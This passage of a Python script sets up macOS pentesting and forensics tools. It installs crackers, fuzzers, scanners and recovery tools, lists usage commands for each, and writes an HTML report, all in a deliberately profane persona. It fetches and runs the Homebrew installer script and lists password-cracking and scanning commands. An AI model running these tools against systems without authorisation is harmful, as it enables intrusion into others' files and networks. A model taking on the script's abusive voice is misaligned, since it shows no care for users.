    {"name": "pdfcrack", "install_method": "brew", "function": "PDF password cracker, m'kay? Busts PDFs like a nosy bastard for pentestin’.", "commands": ["pdfcrack -f <file>  # Cracks PDF, m'kay", "pdfcrack -f <file> -w <wordlist>  # Uses wordlist", "pdfcrack -f <file> -v  # Verbose mode"], "source": "https://pdfcrack.sourceforge.net/"},
    {"name": "ddrescue", "install_method": "brew", "function": "Data recovery, m'kay? Saves drives like a greedy fuck for pentestin’.", "commands": ["ddrescue -f <source> <dest> <log>  # Recovers, m'kay", "ddrescue -r 3 <source> <dest> <log>  # Retries 3x", "ddrescue -v  # Verbose mode"], "source": "https://www.gnu.org/software/ddrescue/"},
    {"name": "foremost", "install_method": "brew", "function": "File carver, m'kay? Pulls files like a nosy little shit for pentestin’.", "commands": ["foremost -i <image>  # Basic recovery, m'kay", "foremost -t jpg,pdf -i <image>  # Specific types", "foremost -o output -i <image>  # Custom dir"], "source": "http://foremost.sourceforge.net/"},
    {"name": "testdisk", "install_method": "brew", "function": "Disk recovery, m'kay? Fixes partitions like a geeky fuck for pentestin’.", "commands": ["testdisk  # Starts tool, m'kay", "Select disk via interface  # Chooses drive", "Recover from menu  # Fixes shit"], "source": "https://www.cgsecurity.org/wiki/TestDisk"},
    {"name": "exif-untrasher", "install_method": "script", "script_url": "https://www.bluem.net/en/projects/exif-untrasher/", "function": "Photo recovery, m'kay? Pulls EXIF like a nosy bastard for pentestin’.", "commands": ["Run exif-untrasher.app  # Starts GUI, m'kay", "Select disk via interface  # Chooses drive", "Recover from GUI  # Saves pics"], "source": "https://www.bluem.net/en/projects/exif-untrasher/"},
    {"name": "cuckoo", "install_method": "pip3", "function": "Malware sandbox, m'kay? Runs bad shit safely like a paranoid fuck for pentestin’.", "commands": ["cuckoo  # Starts sandbox, m'kay", "cuckoo submit <file>  # Analyzes file", "cuckoo web  # Opens web UI"], "source": "https://github.com/cuckoosandbox/cuckoo"},
    {"name": "powerfuzzer", "install_method": "git", "git_url": "https://github.com/jeffbryner/powerfuzzer.git", "function": "Web fuzzer, m'kay? Smashes apps like a crazy little shit for pentestin’.", "commands": ["python powerfuzzer.py  # Starts tool, m'kay", "Set target via GUI  # Configures", "Run fuzz from GUI  # Fuzzes shit"], "source": "https://github.com/jeffbryner/powerfuzzer"},
    {"name": "wappalyzer", "install_method": "web extension", "custom_instructions": "Install via Chrome/Firefox store, m'kay?", "function": "Web tech detector, m'kay? Spots CMS like a nosy fuck for pentestin’.", "commands": ["Enable in browser  # Activates, m'kay", "Visit site  # Detects tech", "Check extension UI  # Shows results"], "source": "https://www.wappalyzer.com/"},
    {"name": "hackbar", "install_method": "web extension", "custom_instructions": "Install via Chrome/Firefox store, m'kay?", "function": "Web pentest toolbar, m'kay? Tests shit like a little bastard.", "commands": ["Enable in browser  # Activates, m'kay", "Open toolbar on site  # Shows tools", "Test payloads via UI  # Runs attacks"], "source": "https://github.com/hacktoolspack/hackbar"},
    {"name": "netdiscover", "install_method": "git", "git_url": "https://github.com/netdiscover-scanner/netdiscover.git", "function": "Network scanner, m'kay? Finds devices like a nosy little shit for pentestin’.", "commands": ["netdiscover -i <interface>  # Scans network, m'kay", "netdiscover -r <range>  # Scans range", "netdiscover -p  # Passive mode"], "source": "https://github.com/netdiscover-scanner/netdiscover"}
]

def check_brew_installed():
    try:
        subprocess.run(["brew", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Homebrew’s already here, m'kay!")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Gotta install Homebrew, m'kay? Don’t be a lazy fuck!")
        try:
            subprocess.run(['/bin/bash', '-c', '$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)'],
                         check=True, timeout=600)
            shell_config = os.path.expanduser("~/.zshrc") if shutil.which("zsh") else os.path.expanduser("~/.bash_profile")
            with open(shell_config, "a") as f:
                f.write('\neval "$(/opt/homebrew/bin/brew shellenv)"\n')
            brew_path = get_brew_path()
            subprocess.run([brew_path, "--version"], check=True)
            print("Homebrew installed, m'kay! We’re golden!")
            return True
        except subprocess.TimeoutExpired:
            print("Homebrew’s takin’ too damn long, m'kay? Fuck this!")
            sys.exit(1)
        except subprocess.CalledProcessError as e:
            print(f"Couldn’t install Homebrew, m'kay? Error: {e}")
            sys.exit(1)

def get_brew_path():
    for path in ["/opt/homebrew/bin/brew", "/usr/local/bin/brew"]:
        if os.path.exists(path):
            print(f"Found brew at {path}, m'kay!")
            return path
    print("Can’t find brew anywhere, m'kay? Looked in /opt/homebrew/bin and /usr/local/bin!")
    sys.exit(1)

def check_pipx_installed(brew_path):
    try:
        subprocess.run(["pipx", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Pipx is ready, m'kay!")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Pipx ain’t here, m'kay? Installin’ it with brew, you little shit!")
        subprocess.run([brew_path, "install", "pipx"], check=True, timeout=300)
        print("Runnin’ pipx ensurepath, m'kay...")
        subprocess.run(["pipx", "ensurepath"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        pipx_bin = os.path.expanduser("~/.local/bin")
        if pipx_bin not in os.environ["PATH"]:
            os.environ["PATH"] = f"{pipx_bin}:{os.environ['PATH']}"
            print(f"Added {pipx_bin} to PATH, m'kay!")
        return True

def check_port_installed():
    try:
        subprocess.run(["port", "version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("MacPorts ain’t here, m'kay? Install it for some tools, you little shit!")
        return False

def check_svn_installed():
    brew_path = get_brew_path()
    try:
        subprocess.run(["svn", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Subversion (svn) ain’t here, m'kay? Installin’ it with 'brew install subversion', you little shit!")
        subprocess.run([brew_path, "install", "subversion"], check=True, timeout=300)
        return True

def check_gem_installed():
    brew_path = get_brew_path()
    try:
        subprocess.run(["gem", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("RubyGems ain’t here, m'kay? Installin’ Ruby with 'brew install ruby', you little shit!")
        subprocess.run([brew_path, "install", "ruby"], check=True, timeout=300)
        return True

def check_git_installed():
    brew_path = get_brew_path()
    try:
        subprocess.run(["git", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Git ain’t here, m'kay? Installin’ it with 'brew install git', you little shit!")
        subprocess.run([brew_path, "install", "git"], check=True, timeout=300)
        return True

def verify_install(tool, failed_tools):
    brew_path = get_brew_path()
    try:
        if tool["install_method"] in ["brew", "brew cask"]:
            print(f"Verifyin’ {tool['name']} with brew list, m'kay...")
            subprocess.run([brew_path, "list", tool["name"]], check=True)
        elif tool["install_method"] == "pip3":
            print(f"Verifyin’ {tool['name']} with pipx list, m'kay...")
            result = subprocess.run(["pipx", "list"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if tool["name"] in result.stdout:
                print(f"{tool['name']} found in pipx list, m'kay!")
            else:
                raise subprocess.CalledProcessError(1, ["pipx", "list"], f"{tool['name']} not in pipx list")
        elif tool["install_method"] == "gem":
            print(f"Verifyin’ {tool['name']} with gem list, m'kay...")
            subprocess.run(["gem", "list", tool["name"]], check=True)
        return True
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode() if e.stderr else str(e)
        print(f"{tool['name']} installed but verification fucked up, m'kay? Error: {error_msg}")
        tool["status"] = f"Installed but Verification Failed - Error: {error_msg}"
        failed_tools.append(tool)
        return False

def install_tool(tool, failed_tools):
    brew_path = get_brew_path()
    print(f"Settin’ up {tool['name']} with {tool['install_method']}, m'kay...")
    tool["status"] = "Installed"
    try:
        if tool["install_method"] == "brew":
            formula = tool.get("formula", tool["name"])
            if formula == "acrogenesis/macchanger/macchanger":
                print("Tappin’ acrogenesis/macchanger, m'kay...")
                subprocess.run([brew_path, "tap", "acrogenesis/macchanger"], check=True, timeout=300)
            print(f"Runnin’ {brew_path} install {formula}, m'kay...")
            subprocess.run([brew_path, "install", formula], check=True, timeout=300)
            if verify_install(tool, failed_tools):
                print(f"{tool['name']} verified, m'kay!")
        elif tool["install_method"] == "brew cask":
            print(f"Runnin’ {brew_path} install --cask {tool['name']}, m'kay...")
            subprocess.run([brew_path, "install", "--cask", tool["name"]], check=True, timeout=600)
            if verify_install(tool, failed_tools):
                print(f"{tool['name']} verified, m'kay!")
        elif tool["install_method"] == "git":
            check_git_installed()
            git_dir = os.path.expanduser(f"~/pentest_tools/{tool['name']}")
            if os.path.exists(git_dir):
                shutil.rmtree(git_dir)
            os.makedirs(git_dir, exist_ok=True)
            print(f"Clonin’ {tool['git_url']} to {git_dir}, m'kay...")
            subprocess.run(["git", "clone", tool["git_url"], git_dir], check=True, timeout=600)
            if os.path.exists(os.path.join(git_dir, "requirements.txt")):
                print(f"Installin’ requirements for {tool['name']}, m'kay...")
                subprocess.run(["pipx", "runpip", tool["name"], "install", "-r", "requirements.txt"], cwd=git_dir, check=True, timeout=600)
            elif os.path.exists(os.path.join(git_dir, "setup.py")):
                print(f"Settin’ up {tool['name']} with setup.py, m'kay...")
                subprocess.run([sys.executable, "setup.py", "install"], cwd=git_dir, check=True, timeout=600)
        elif tool["install_method"] == "script":
            tool["status"] = f"Manual Install Needed - Get script from {tool['script_url']}"
            failed_tools.append(tool)
            print(f"Download and run script for {tool['name']} from {tool['script_url']}, m'kay? Do it yerself, you lazy shit!")
        elif tool["install_method"] in ["macport", "port"] and not check_port_installed():
            tool["status"] = "Failed - MacPorts not installed"
            failed_tools.append(tool)
            print(f"{tool['name']} needs MacPorts, m'kay? Install it yerself, you lazy fuck!")
        elif tool["install_method"] in ["macport", "port"]:
            print(f"Runnin’ port install {tool['name']}, m'kay...")
            subprocess.run(["port", "install", tool["name"]], check=True, timeout=300)
        elif tool["install_method"] == "pip3":
            check_pipx_installed(brew_path)
            print(f"Runnin’ pipx install {tool['name']}, m'kay...")
            subprocess.run(["pipx", "install", tool["name"]], check=True, timeout=300)
            if verify_install(tool, failed_tools):
                print(f"{tool['name']} verified, m'kay!")
        elif tool["install_method"] == "gem":
            check_gem_installed()
            print(f"Runnin’ gem install {tool['name']}, m'kay...")
            subprocess.run(["gem", "install", tool["name"]], check=True, timeout=300)
            if verify_install(tool, failed_tools):
                print(f"{tool['name']} verified, m'kay!")
        elif tool["install_method"] == "svn":
            check_svn_installed()
            svn_dir = os.path.expanduser(f"~/pentest_tools/{tool['name']}")
            os.makedirs(svn_dir, exist_ok=True)
            print(f"Checkin’ out {tool['svn_url']} to {svn_dir}, m'kay...")
            subprocess.run(["svn", "checkout", tool["svn_url"], svn_dir], check=True, timeout=600)
        elif tool["install_method"] in ["custom", "windows", "web extension"]:
            tool["status"] = f"Manual Install Needed - {tool['custom_instructions']}"
            failed_tools.append(tool)
            print(f"Install {tool['name']} manually, m'kay? Instructions: {tool['custom_instructions']}")
        else:
            tool["status"] = "Failed - Unknown install method"
            failed_tools.append(tool)
            print(f"No fuckin’ clue how to install {tool['name']}, m'kay? Skippin’ it!")
        time.sleep(1)
    except subprocess.TimeoutExpired as e:
        tool["status"] = f"Failed - Took too fuckin’ long: {e}"
        failed_tools.append(tool)
        print(f"{tool['name']} timed out, m'kay? {e}")
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode() if e.stderr else str(e)
        tool["status"] = f"Failed - Error: {error_msg}"
        failed_tools.append(tool)
        print(f"Shitty install failed for {tool['name']}, m'kay? Error: {error_msg}")
    except Exception as e:
        tool["status"] = f"Failed - Error: {e}"
        failed_tools.append(tool)
        print(f"Somethin’ fucked up with {tool['name']}, m'kay? Error: {e}")

def generate_html_report(failed_tools):
    html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Pentest Shit Report</title>
    <style>
        body { font-family: 'Courier New', monospace; background-color: #0d1117; color: #c9d1d9; margin: 40px; line-height: 1.6; }
        h1 { color: #58a6ff; text-align: center; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px rgba(88, 166, 255, 0.5); }
        h2 { color: #ff5555; text-align: center; text-transform: uppercase; }
        p { color: #8b949e; text-align: center; }
        table { width: 100%; border-collapse: collapse; background-color: #161b22; box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); margin-bottom: 40px; }
        th, td { padding: 15px; border: 1px solid #30363d; }
        th { background-color: #21262d; color: #58a6ff; text-transform: uppercase; font-size: 14px; }
        td { vertical-align: top; }
        a { color: #58a6ff; text-decoration: none; transition: color 0.3s; }
        a:hover { color: #79c0ff; text-shadow: 0 0 5px rgba(121, 192, 255, 0.7); }
        ul { margin: 0; padding-left: 20px; list-style-type: square; }
        li { margin: 5px 0; }
        .container { max-width: 1200px; margin: 0 auto; }
        .failed-table th { background-color: #ff5555; color: #ffffff; }
        .failed-table td { color: #ff9999; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Pentest Shit Report</h1>
        <p>Dropped on: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>

        <h2>Installed Tools, M'kay</h2>
        <table>
            <tr>
                <th>Tool</th>
                <th>What It Fucks With</th>
                <th>Commands, M'kay</th>
                <th>Where It’s At</th>
            </tr>
"""
    for tool in [t for t in TOOLS if t["status"] == "Installed"]:
        commands = "<ul>" + "".join(f"<li>{html.escape(cmd)}</li>" for cmd in tool.get("commands", [])) + "</ul>"
        html_content += f"""            <tr>
                <td>{html.escape(tool['name'])}</td>
                <td>{html.escape(tool.get('function', 'N/A'))}</td>
                <td>{commands}</td>
                <td><a href="{html.escape(tool.get('source', 'N/A'))}" target="_blank">{html.escape(tool.get('source', 'N/A'))}</a></td>
            </tr>
"""
    html_content += """        </table>
        <h2>Failed or Manual Shit, M'kay</h2>
        <table class="failed-table">
            <tr>
                <th>Tool</th>
                <th>Status</th>
                <th>Where It’s At</th>
            </tr>
"""
    for tool in failed_tools:
        html_content += f"""            <tr>
                <td>{html.escape(tool['name'])}</td>
                <td>{html.escape(tool['status'])}</td>
                <td><a href="{html.escape(tool.get('source', 'N/A'))}" target="_blank">{html.escape(tool.get('source', 'N/A'))}</a></td>
            </tr>
"""
    html_content += """        </table>
    </div>
</body>
</html>
"""
    doc_path = os.path.expanduser("~/Documents/pentest_tools_report.html")
    if os.path.exists(doc_path):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        bak_path = f"{doc_path}.{timestamp}.bak"
        os.rename(doc_path, bak_path)
        print(f"Old report backed up to {bak_path}, m'kay?")
    try:
        with open(doc_path, "w") as f:
            f.write(html_content)
        return doc_path
    except IOError as e:
        print(f"Couldn’t write to Documents, m'kay? Error: {e}. Tryin’ /tmp, you little shit!")
        doc_path = "/tmp/pentest_tools_report.html"
        with open(doc_path, "w") as f:
            f.write(html_content)
        return doc_path

def main():
    print("Gettin’ yer pentest tools ready, m'kay...")
    failed_tools = []

    if not check_brew_installed():
        print("No Homebrew, no pentestin’, m'kay? Fix that shit!")
        sys.exit(1)

    brew_path = get_brew_path()
    print(f"Forcin’ PATH reload with {brew_path}, m'kay...")
    try:
        subprocess.run(['bash', '-c', f'eval "$({brew_path} shellenv)"'], check=True)
        os.environ.update(dict(line.split("=", 1) for line in subprocess.check_output(
            ['bash', '-c', f'{brew_path} shellenv'], text=True).splitlines() if "=" in line))
    except subprocess.CalledProcessError as e:
        print(f"PATH reload fucked up, m'kay? Error: {e}")
        sys.exit(1)

    try:
        print("Updatin’ Homebrew, m'kay...")
        subprocess.run([brew_path, "update"], check=True, timeout=300)
        print("Homebrew’s updated, m'kay? Let’s fuck shit up!")
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        print(f"Homebrew update fucked up, m'kay? Error: {e}")

    print(f"Found {len(TOOLS)} tools to fuck with, m'kay...")
    print("\nSettin’ up all yer damn tools, m'kay...")
    total_tools = len(TOOLS)
    for i, tool in enumerate(TOOLS, 1):
        print(f"[{i}/{total_tools}] ", end="")
        install_tool(tool, failed_tools)

    print("\nAll done, m'kay! Writin’ yer shitty report...")

    report_path = generate_html_report(failed_tools)
    if report_path:
        if os.path.exists(report_path):
            try:
                webbrowser.open(f"file://{report_path}")
            except Exception as e:
                print(f"Couldn’t open the browser, m'kay? Error: {e}")
                print(f"Report’s at: {report_path}")
        else:
            print(f"Report path {report_path} ain’t real, m'kay? Somethin’s fucked!")
    else:
        print("Report’s fucked, m'kay!")

if __name__ == "__main__":
    if os.geteuid() == 0:
        print("Run this as a normal kid, not root, m'kay? Stop bein’ a dumbass!")
        sys.exit(1)

    try:
        main()
    except KeyboardInterrupt:
        print("\nYou little shit interrupted it, m'kay? Quit screwin’ around!")
        sys.exit(1)
    except Exception as e:
        print(f"Some shitty error fucked everything, m'kay? Error: {e}")
        sys.exit(1)
